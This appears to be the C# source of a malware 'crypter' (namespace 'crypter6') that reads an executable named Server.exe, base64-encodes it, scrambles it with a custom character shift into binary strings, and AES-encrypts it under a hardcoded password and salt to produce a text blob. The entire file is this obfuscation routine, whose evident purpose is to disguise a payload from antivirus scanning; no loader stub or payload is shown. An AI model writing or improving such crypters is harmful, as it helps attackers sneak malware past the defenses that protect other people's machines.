using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace crypter6
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] code = File.ReadAllBytes("C:\\Users\\Mahmoud\\Desktop\\Server.exe");
            String code64 = Convert.ToBase64String(code);
            String password = "fuckingdarkworld";
            String finall = EncryptText(encrypt(code64), password);
            Console.WriteLine(finall);
            File.WriteAllText("C: \\Users\\Mahmoud\\Desktop\\combined.txt", finall);

        }
        public static  string EncryptText(string input, string password)
        {
            // Get the bytes of the string
            byte[] bytesToBeEncrypted = Encoding.UTF8.GetBytes(input);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            string result = Convert.ToBase64String(bytesEncrypted);

            return result;
        }
        public static  byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 ,5,4,6,3,3,2,1,2,3,4,10,15,18,20};

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }
        public static String encrypt(String tobeencrtpted)
        {
            String s = "";
            int l = 0;
            foreach (char c in tobeencrtpted)
            {
                int m = (int)c;
                if (m > 5 && m <= 127)
                    m -= 5;
                s += Convert.ToString(m, 2);
                l++;
                if (l == tobeencrtpted.Length)
                    continue;
                s += "/";
            }
            return s;

        }
    }
}
